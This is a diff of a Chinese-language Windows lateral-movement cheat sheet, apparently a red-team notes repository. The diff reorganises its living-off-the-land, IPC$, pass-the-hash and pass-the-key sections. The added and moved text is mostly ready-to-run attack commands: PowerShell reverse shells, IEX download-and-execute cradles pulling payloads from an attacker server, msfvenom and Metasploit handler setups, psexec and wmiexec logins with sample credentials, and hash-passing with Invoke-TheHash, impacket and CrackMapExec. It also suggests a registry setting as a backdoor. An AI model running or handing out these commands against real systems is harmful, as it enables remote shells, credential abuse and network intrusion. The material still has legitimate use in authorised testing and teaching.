@@ -13,6 +13,8 @@
 * **[漏洞利用](#漏洞利用)**
 
 * **[LOL](#LOL)**
+    * [PowerShell](#powershell)
+    * [Other](#other)
 
 * **[RDP](#rdp)**
     * [命令行开启RDP](#命令行开启rdp)
@@ -22,17 +24,19 @@
 
 * **[认证](#认证)**
     * [本地](#本地)
+    * [工作组](#工作组)
+        * [IPC$](#ipc$)
+        * [PTH](#pth)
+        * [PTK](#ptk)
     * [域](#域)
         * [NTDS.DIT](#ntdsdit)
             * [利用Dcsync获取域用户Hash](#利用dcsync获取域用户hash)
             * [使用VSS卷影副本提取ntds.dit](#使用vss卷影副本提取ntdsdit)
             * [NTDS转储](#ntds转储)
         * [GPP](#gpp)
-        * [PTH](#pth)
         * [PTT](#ptt)
             * [Silver_Tickets](#silver_tickets)
             * [Golden_Tickets](#golden_tickets)
-        * [PTK](#ptk)
         * [Kerberoast](#kerberoast)
         * [Kerberoasting](#kerberoasting)
         * [委派](#委派)
@@ -58,13 +62,8 @@
 **相关资源**
 - [LOLBAS](https://lolbas-project.github.io/)
 
-**nc**
-```
-路径\nc.exe -l -p 端口 -t -e 路径\cmd.exe
-c:\RECYCLER\nc.exe -l -p 1234 -t -e c:\RECYCLER\cmd.exe
-```
+## PowerShell
 
-**powershell**
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -76,6 +75,63 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1'
 ```powershell
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
+
+**Powercat.exe**
+
+Powercat 是 PowerShell 的本机后门侦听器和 reverse shel，也称为 netcat 的修改版本，因为它集成了对生成的编码 Payload 的支持，msfvenom 可以做到这一点，并且还具有客户端到客户端的中继(Powercat 客户端的术语，允许连接两个单独的侦听器)。
+
+攻击端
+```bash
+git clone https://github.com/besimorhino/powercat.git
+cd powercat
+python -m SimpleHTTPServer 80
+
+nc -lvp 1234
+```
+目标端
+```bash
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
+```
+
+**Batch File**
+
+攻击端
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
+
+python -m SimpleHTTPServer 80
+
+nc -lvp 4444
+```
+
+目标端
+```bash
+powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+```
+
+**Cscript**
+
+攻击端
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
+
+python -m SimpleHTTPServer 80
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set lport 1234
+exploit
+```
+
+目标端
+```bash
+powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+```
+
+---
+
+## Other
 
 **perl**
 ```perl
@@ -177,59 +233,6 @@ exploit
 certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
 ```
 
-**Powercat.exe**
-
-Powercat 是 PowerShell 的本机后门侦听器和 reverse shel，也称为 netcat 的修改版本，因为它集成了对生成的编码 Payload 的支持，msfvenom 可以做到这一点，并且还具有客户端到客户端的中继(Powercat 客户端的术语，允许连接两个单独的侦听器)。
-
-攻击端
-```bash
-git clone https://github.com/besimorhino/powercat.git
-cd powercat
-python -m SimpleHTTPServer 80
-
-nc -lvp 1234
-```
-目标端
-```bash
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
-```
-
-**Batch File**
-
-攻击端
-```bash
-msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
-
-python -m SimpleHTTPServer 80
-
-nc -lvp 4444
-```
-
-目标端
-```bash
-powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
-```
-
-**Cscript**
-
-攻击端
-```bash
-msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
-
-python -m SimpleHTTPServer 80
-
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.1.109
-set lport 1234
-exploit
-```
-
-目标端
-```bash
-powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
-```
-
 **Msiexec.exe**
 
 msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：
@@ -259,7 +262,7 @@ msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过�
 下载地址 : https://www.microsoft.com/en-us/download/details.aspx?id=21714
 
 msxsl.exe 需要接受两个文件，XML 及 XSL 文件，可以远程加载
-```
+```bash
 msxsl http://192.168.1.1/1/demo.xml http://192.168.1.1/1/exec.xsl
 ```
 
@@ -299,27 +302,27 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
 
 在 Windows 7 以上版本存在一个名为 PubPrn.vbs 的微软已签名 WSH 脚本，其位于`C:\Windows\System32\Printing_Admin_Scripts\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给 GetObject()
 
-```
+```bash
 "C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
 ```
 
 **conhost**
-```
+```bash
 conhost calc.exe
 ```
 
 **schtasks**
-```
+```bash
 schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
 /sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
-schtasks /F /delete /tn foobar /S host                          ## 清除 schtasks
+schtasks /F /delete /tn foobar /S host                          # 清除 schtasks
 ```
 
 **SC**
-```
-sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    ## 新建服务,指向拷贝的木马路径
-sc \\host start foobar                                          ## 启动建立的服务
-sc \\host delete foobar                                         ## 完事后删除服务
+```bash
+sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    # 新建服务,指向拷贝的木马路径
+sc \\host start foobar                                          # 启动建立的服务
+sc \\host delete foobar                                         # 完事后删除服务
 ```
 
 ---
@@ -335,12 +338,12 @@ sc \\host delete foobar                                         ## 完事后删�
 ## 命令行开启RDP
 
 **查看 3389 端口是否开启**
-```
+```bash
 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启
 ```
 
 **查看远程连接的端口**
-```
+```bash
 REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
 ```
 
@@ -499,11 +502,241 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 - [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
 - [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。
 
+---
+
+## 工作组
+
+### IPC$
+
+关于 IPC$ 应用的基本知识点可见笔记 [IPC$](../../../Integrated/windows/笔记/IPC$.md)
+
+**相关文章**
+- [IPC$入侵大全](https://www.cnblogs.com/backlion/p/7401609.html)
+- [内网渗透 | 基于IPC的横向移动](https://sec.thief.one/article_content?a_id=033847e03bd6e49dbc730c7315d5b4d6)
+- [关于IPC和PTH用户权限问题](https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/)
+
+**IPC$ 的利用条件**
+
+- 139，445 端口开启
+- 管理员开启了默认共享
+
+**攻击方式**
+```bash
+net use \\192.168.1.1\c$ “12345@12345qw” /user:ffffffff0x\administrator
+net use \\192.168.1.1\c$ "123456" /user:administrator         # 建立的非空连接
+net use \\192.168.1.1\c$  "" /user:administrator              # 空连接，无密码
+net use \\192.168.1.1\c$ /del   # 删除建立的IPC连接
+net use                         # 查看本机连接共享情况
+
+psexec.exe \\192.168.1.1 cmd    # 通过 psexec 工具进行会话连接执行
+psexec.exe \\192.168.1.1 cmd -u administrator -p 123456
+
+csript.exe wmiexec.vbs /shell 192.168.1.1 administrator 123456
+```
+
+---
+
+### PTH
+
+path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。
+
+利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用 NTLM 认证的一种缺陷，利用用户的密码哈希值来进行 NTLM 认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器，扩展权限。
+
+**相关文章**
+- [hash传递攻击研究](http://sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/)
+- [Passing-the-Hash to NTLM Authenticated Web Applications](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/) - PTH 在 Web 应用中的应用
+- [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
+- [KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)
+
+**攻击适用情况**
+- 在工作组环境中：
+    - Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
+    - Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非 administrator)也不能使用哈希传递攻击，会提示拒绝访问。
+- 在域环境中
+    - 只能是域管理员组内用户(可以是域管理员组内非 administrator 用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。
+
+**攻击必要条件**
+
+- 哈希传递需要被认证的主机能够访问到服务器
+- 哈希传递需要被传递认证的用户名
+- 哈希传递需要被传递认证用户的 NTLM Hash
+
+**攻击方式**
+
+通常来说，pass-the-hash 的攻击模式是这样的：
+1. 获取一台域主机高权限
+2. 利用 mimikatz 等工具导出密码 hash
+3. 用导出的 hash 尝试登陆其他域主机
+
+要完成一个 NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待服务器端给出的 Challenge⋯⋯,其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Chanllenge 加密，生成一个 Response，来完成认证。
+
+Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程，所以不算是一个漏洞，算是一个技巧。
+
+比如 SMB 可以直接基于 TCP 协议或者 NetBIOS over TCP，SMB 的认证可以基于 SMB，也可以基于 kerberos，这两种认证方式，前者本质上使用了 hash，后者本质上使用了 ticket，导致了 SMB 的 PtH 和 PtT 攻击存在的基础。
+
+目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。
+
+- **mimikatz**
+
+    mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#pth)
+
+- **wmiexec**
+    - [Invoke-WMIExec](https://github.com/Kevin-Robertson/Invoke-TheHash)
+        ```
+        Invoke-Module Invoke-TheHash.psd1
+        Invoke-WMIExec -Target 192.168.1.1 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
+        Invoke-SMBExec -Target 192.168.1.1 -Domain test.local -Username test1 -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
+        ```
+
+    - [wmiexec](https://github.com/maaaaz/impacket-examples-windows)
+        ```
+        wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.1.1 "whoami"
+        ```
+
+- **WMIC**
+    ```cmd
+    wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
+    ```
+
+- **PStools**
+    ```cmd
+    psexec.exe \\ip –accepteula -u username -p password program.exe
+    ```
+
+    ```
+    psexec \\ip -u user -p passwd cmd /c dir D:\
+    ```
+
+- **smbexec**
+    ```
+    copy execserver.exe \\host\c$\windows\
+    test.exe ip user password command netshare
+    ```
+
+- **[impacket](https://github.com/SecureAuthCorp/impacket)**
+    ```bash
+    git clone https://github.com/CoreSecurity/impacket.git
+    cd impacket/
+    python setup.py install
+    cd impacket/examples
+    ```
+    - **Psexec.py**
+
+        Psexec.py 允许你在远程 Windows 系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程 shell 命令（不需要安装任何客户端软件）。
+        ```
+        ./psexec.py test/Administrator:Abcd1234@192.168.1.100
+        ```
+
+    - **Wmiexec.py**
+
+        它会生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。你不需要在目标服务器
+        ```
+        ./wmiexec.py test/Administrator:Abcd1234@192.168.1.100
+        ```
+
+    - **Atexec.py**
+
+        通过 Task Scheduler 服务在目标系统上执行命令，并返回输出结果。
+        ```
+        ./atexec.py test/Administrator:Abcd1234@192.168.1.100 whoami
+        ```
+
+- **metasploit**
+
+    目标主机的 Vista 之后的机器，所以只能使用 administrator 用户进行攻击。
+    ```bash
+    use exploit/windows/smb/psexec # 或 use exploit/windows/smb/psexec_psh
+    set rhosts [ip]
+    set smbuser [user]          # 域中的 PTH 这里不需要写域前缀
+    set smbpass [password]      # 例如: 00000000000000000000000000000000:c780c78872a102256e946b3ad238f661
+
+    set payload windows/meterpreter/reverse_tcp
+    set lhost [ip]
+
+    # 工具的参数需要填写固定格式 LM hash:NT hash，可以将 LM hash 填 0(LM hash 可以为任意值)，即 00000000000000000000000000000000:NT hash。
+    exploit
+    ```
+
+- **pth-winexe**
+
+    kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
+    ```bash
+    export SMBHASH=xxxxxx...:xxxx...
+    pth-winexe -U administrator% //target-ip cmd
+    # no password 就需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
+    ```
+
+- **[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)**
+    ```bash
+    cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
+    ```
+
+#### kb2871997
+
+> 以下部分内容来自 <sup>[Windows内网协议学习NTLM篇之NTLM基础介绍](https://www.anquanke.com/post/id/193149)、[KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)</sup>
+
+在 type3 计算 response 的时候，客户端是使用用户的 hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户 hash。
+
+微软在2014年5月13日发布了针对 Pass The Hash 的更新补丁 kb2871997，能够缓解 PTH,具体更改为以下几点。
+- 支持“Protected Users”组；
+    - “Protected Users”组是 Windows Server 2012 R2 域中的安全组，“Protected Users”组的成员会被强制使用 Kerberos 身份验证，并且对 Kerberos 强制执行 AES 加密。
+- Restricted Admin RDP 模式的远程桌面客户端支持；
+    - Restricted Admin RDP 模式是为了避免将 Client 端的凭据暴露给远程系统，同时也产生一种变种的 Pass The Hash（Passing the Hash with Remote Desktop）
+- 注销后删除 LSASS 中的凭据；
+    - 在这个更新之前，只要用户登录系统，Windows 就会在 lsass 中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos 的 TGT 票据/Session Key。
+- 添加两个新的 SID；
+    - 本地帐户，LOCAL_ACCOUNT（S-1-5-113），所有本地帐户继承自此 SID；
+    - 本地帐户和管理组成员，LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（S-1-5-114），所有管理员组的本地用户继承此 SID。
+    - 注意：S-1-5-114 这里在中文操作系统中提供的翻译是“NT AUTHORITY\本地帐户和管理员组成员”，但实际上是“所有本地 Administrators 组中的本地帐户”，即域用户即使被加入到了本地 Administrators 组也不继承此 SID。
+- LSASS 中只允许 wdigest 存储明文密码。
+
+但 kb2871997 对于本地 Administrator(rid 为 500，操作系统只认 rid 不认用户名，接下来我们统称 RID 500 帐户)和本地管理员组的域用户是没有影响的。
+
+但 ntlm 认证通过之后，对 ADMIN$ 没有写入权限。那么是什么阻止了我们对本地管理员组的非 RID500 帐户使用哈希传递？为什么 RID 500 帐户具有特殊情况？除此之外，为什么本地管理员成员的域帐户也可以免除这种阻止行为。
+
+真正罪魁祸首是远程访问上下文中的用户帐户控制（UAC）令牌筛选
+
+根据微软官方关于远程访问和用户帐户控制的相关文档可以了解到，UAC 为了更好的保护 Administrators 组的帐户，会在网络上进行限制。
+
+对于本地“管理员”组中的域用户帐户，文档指出：当具有域用户帐户的用户远程登录 Windows Vista 计算机并且该用户是 Administrators 组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的 UAC 被禁用在该会话的远程计算机上。
+
+对于远程连接到 Windows Vista+ 计算机的任何非 RID 500 本地管理员帐户，无论是通过 WMI，PSEXEC 还是其他方法(有个例外，那就是通过 RDP 远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌，但是在域用户被加入到本地管理员组之后，域用户可以使用完全管理员（full administrator）的 Access Token 运行，并且 UAC 不会生效。
+
+实验中域用户 test 能够成功 PTH，而本地用户 test1 pth 无法成功，是因为以 test1 pth 的身份发起的请求被 UAC 拒绝。而 administrator 用户成功的原因同样是因为 UAC。
+
+- **FilterAdministratorToken**
+
+    那如何限制 administrator 的远程登录呢？那就是直接把 FilterAdministratorToken 开启就可以了。路径 ：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 设置为 1,修改之后策略会立即生效，使用 administrator 的远程连接也被拒绝了
+
+- **LocalAccountTokenFilterPolicy**
+
+    那如何禁用 UAC 的限制？如果注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` 项存在(默认不存在)且配置为 1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非 RID 500 帐户连接，并且可以成功传递哈希值！
+
+    默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，在配置 winrm 的时候，也会遇到同样的问题，本地管理员组的非 RID500 账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。
+
+#### PTH with RDP
+
+![](../../../../assets/img/才怪.png)
+
+---
+
+### PTK
+
+对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012，可以使用 AES keys 代替 NT hash
+
+**攻击方式**
+- **mimikatz**
+
+    mimikatz 的 PTK 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ptk)
+
+---
+
 ## 域
 
 **相关文章**
 - [横向渗透-域渗透 PTT、PTH、PTK](http://1984-0day.com/2020/04/05/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F-PTT%E3%80%81PTH%E3%80%81PTK/)
 - [我所了解的内网渗透——内网渗透知识大总结](https://www.anquanke.com/post/id/92646#h2-10)
+- [域渗透之IPC MS14068 Pth Ptt Ptk Kerberoating](https://www.chabug.org/web/686.html)
 
 ### NTDS.DIT
 
@@ -770,191 +1003,6 @@ Get-DecryptedCpassword "9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U"
 
 ---
 
-### PTH
-
-path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。
-
-利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用 NTLM 认证的一种缺陷，利用用户的密码哈希值来进行 NTLM 认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器，扩展权限。
-
-**相关文章**
-- [hash传递攻击研究](http://sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/)
-- [Passing-the-Hash to NTLM Authenticated Web Applications](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/) - PTH 在 Web 应用中的应用
-- [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
-- [KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)
-
-**攻击适用情况**
-- 在工作组环境中：
-    - Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
-    - Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非 administrator)也不能使用哈希传递攻击，会提示拒绝访问。
-- 在域环境中
-    - 只能是域管理员组内用户(可以是域管理员组内非 administrator 用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。
-
-**攻击必要条件**
-
-- 哈希传递需要被认证的主机能够访问到服务器
-- 哈希传递需要被传递认证的用户名
-- 哈希传递需要被传递认证用户的 NTLM Hash
-
-**攻击方式**
-
-通常来说，pass-the-hash 的攻击模式是这样的：
-1. 获取一台域主机高权限
-2. 利用 mimikatz 等工具导出密码 hash
-3. 用导出的 hash 尝试登陆其他域主机
-
-要完成一个 NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待服务器端给出的 Challenge⋯⋯,其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Chanllenge 加密，生成一个 Response，来完成认证。
-
-Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程，所以不算是一个漏洞，算是一个技巧。
-
-比如 SMB 可以直接基于 TCP 协议或者 NetBIOS over TCP，SMB 的认证可以基于 SMB，也可以基于 kerberos，这两种认证方式，前者本质上使用了 hash，后者本质上使用了 ticket，导致了 SMB 的 PtH 和 PtT 攻击存在的基础。
-
-目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。
-
-- **mimikatz**
-
-    mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#pth)
-
-- **wmiexec**
-    - [Invoke-WMIExec](https://github.com/Kevin-Robertson/Invoke-TheHash)
-        ```
-        Invoke-Module Invoke-TheHash.psd1
-        Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
-        ```
-
-    - [wmiexec](https://github.com/maaaaz/impacket-examples-windows)
-        ```
-        wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"
-        ```
-
-- **WMIC**
-    ```cmd
-    wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
-    ```
-
-- **PStools**
-    ```cmd
-    psexec.exe \\ip –accepteula -u username -p password program.exe
-    ```
-
-    ```
-    psexec \\ip -u user -p passwd cmd /c dir D:\
-    ```
-
-- **smbexec**
-    ```
-    copy execserver.exe \\host\c$\windows\
-    test.exe ip user password command netshare
-    ```
-
-- **impacket**
-    - 工具地址 : https://github.com/SecureAuthCorp/impacket
-        ```bash
-        git clone https://github.com/CoreSecurity/impacket.git
-        cd impacket/
-        python setup.py install
-        cd impacket/examples
-        ```
-        - **Psexec.py**
-
-            Psexec.py 允许你在远程 Windows 系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程 shell 命令（不需要安装任何客户端软件）。
-            ```
-            ./psexec.py test/Administrator:Abcd1234@192.168.1.100
-            ```
-
-        - **Wmiexec.py**
-
-            它会生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。你不需要在目标服务器
-            ```
-            ./wmiexec.py test/Administrator:Abcd1234@192.168.1.100
-            ```
-
-        - **Atexec.py**
-
-            通过 Task Scheduler 服务在目标系统上执行命令，并返回输出结果。
-            ```
-            ./atexec.py test/Administrator:Abcd1234@192.168.1.100 whoami
-            ```
-
-- **metasploit**
-
-    目标主机的 Vista 之后的机器，所以只能使用 administrator 用户进行攻击。
-    ```bash
-    use exploit/windows/smb/psexec # 或 use exploit/windows/smb/psexec_psh
-    set rhosts [ip]
-    set smbuser [user]          # 域中的 PTH 这里不需要写域前缀
-    set smbpass [password]      # 例如: 00000000000000000000000000000000:c780c78872a102256e946b3ad238f661
-
-    set payload windows/meterpreter/reverse_tcp
-    set lhost [ip]
-
-    # 工具的参数需要填写固定格式 LM hash:NT hash，可以将 LM hash 填 0(LM hash 可以为任意值)，即 00000000000000000000000000000000:NT hash。
-    exploit
-    ```
-
-- **pth-winexe**
-
-    kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
-    ```bash
-    export SMBHASH=xxxxxx...:xxxx...
-    pth-winexe -U administrator% //target-ip cmd
-    # no password 就需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
-    ```
-
-- **CrackMapExec**
-    - 工具地址 : https://github.com/byt3bl33d3r/CrackMapExec
-        ```
-        cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
-        ```
-
-#### kb2871997
-
-> 以下部分内容来自 <sup>[Windows内网协议学习NTLM篇之NTLM基础介绍](https://www.anquanke.com/post/id/193149)、[KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)</sup>
-
-在 type3 计算 response 的时候，客户端是使用用户的 hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户 hash。
-
-微软在2014年5月13日发布了针对 Pass The Hash 的更新补丁 kb2871997，能够缓解 PTH,具体更改为以下几点。
-- 支持“Protected Users”组；
-    - “Protected Users”组是 Windows Server 2012 R2 域中的安全组，“Protected Users”组的成员会被强制使用 Kerberos 身份验证，并且对 Kerberos 强制执行 AES 加密。
-- Restricted Admin RDP 模式的远程桌面客户端支持；
-    - Restricted Admin RDP 模式是为了避免将 Client 端的凭据暴露给远程系统，同时也产生一种变种的 Pass The Hash（Passing the Hash with Remote Desktop）
-- 注销后删除 LSASS 中的凭据；
-    - 在这个更新之前，只要用户登录系统，Windows 就会在 lsass 中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos 的 TGT 票据/Session Key。
-- 添加两个新的 SID；
-    - 本地帐户，LOCAL_ACCOUNT（S-1-5-113），所有本地帐户继承自此 SID；
-    - 本地帐户和管理组成员，LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（S-1-5-114），所有管理员组的本地用户继承此 SID。
-    - 注意：S-1-5-114 这里在中文操作系统中提供的翻译是“NT AUTHORITY\本地帐户和管理员组成员”，但实际上是“所有本地 Administrators 组中的本地帐户”，即域用户即使被加入到了本地 Administrators 组也不继承此 SID。
-- LSASS 中只允许 wdigest 存储明文密码。
-
-但 kb2871997 对于本地 Administrator(rid 为 500，操作系统只认 rid 不认用户名，接下来我们统称 RID 500 帐户)和本地管理员组的域用户是没有影响的。
-
-但 ntlm 认证通过之后，对 ADMIN$ 没有写入权限。那么是什么阻止了我们对本地管理员组的非 RID500 帐户使用哈希传递？为什么 RID 500 帐户具有特殊情况？除此之外，为什么本地管理员成员的域帐户也可以免除这种阻止行为。
-
-真正罪魁祸首是远程访问上下文中的用户帐户控制（UAC）令牌筛选
-
-根据微软官方关于远程访问和用户帐户控制的相关文档可以了解到，UAC 为了更好的保护 Administrators 组的帐户，会在网络上进行限制。
-
-对于本地“管理员”组中的域用户帐户，文档指出：当具有域用户帐户的用户远程登录 Windows Vista 计算机并且该用户是 Administrators 组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的 UAC 被禁用在该会话的远程计算机上。
-
-对于远程连接到 Windows Vista+ 计算机的任何非 RID 500 本地管理员帐户，无论是通过 WMI，PSEXEC 还是其他方法(有个例外，那就是通过 RDP 远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌，但是在域用户被加入到本地管理员组之后，域用户可以使用完全管理员（full administrator）的 Access Token 运行，并且 UAC 不会生效。
-
-实验中域用户 test 能够成功 PTH，而本地用户 test1 pth 无法成功，是因为以 test1 pth 的身份发起的请求被 UAC 拒绝。而 administrator 用户成功的原因同样是因为 UAC。
-
-- **FilterAdministratorToken**
-
-    那如何限制 administrator 的远程登录呢？那就是直接把 FilterAdministratorToken 开启就可以了。路径 ：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 设置为 1,修改之后策略会立即生效，使用 administrator 的远程连接也被拒绝了
-
-- **LocalAccountTokenFilterPolicy**
-
